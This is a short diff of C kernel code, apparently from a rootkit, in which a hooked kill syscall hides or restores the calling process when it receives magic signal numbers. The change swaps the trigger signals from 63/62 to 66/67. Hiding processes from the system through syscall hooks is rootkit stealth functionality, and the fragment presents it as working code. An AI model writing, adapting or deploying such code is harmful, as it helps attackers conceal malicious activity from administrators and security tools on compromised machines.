@@ -65,12 +65,12 @@ asmlinkage int hook_tar_kill(const struct pt_regs *pt){
     #endif
     //Whose SELinux is enforcing? I won't do anything with it. Look at KernelSU/kernel/core_hook.c for SELinux
     return 0;
-  }else if(pid==0&&sig==63){
+  }else if(pid==0&&sig==66){
     printk(KERN_INFO "Hide process for %d",current->pid);
     //Let's hide out process
     hide_pid(current->pid);
     return 0;
-  }else if(pid==0&&sig==62){
+  }else if(pid==0&&sig==67){
     recover_hide_pid(current->pid);
     return 0;
   }else{
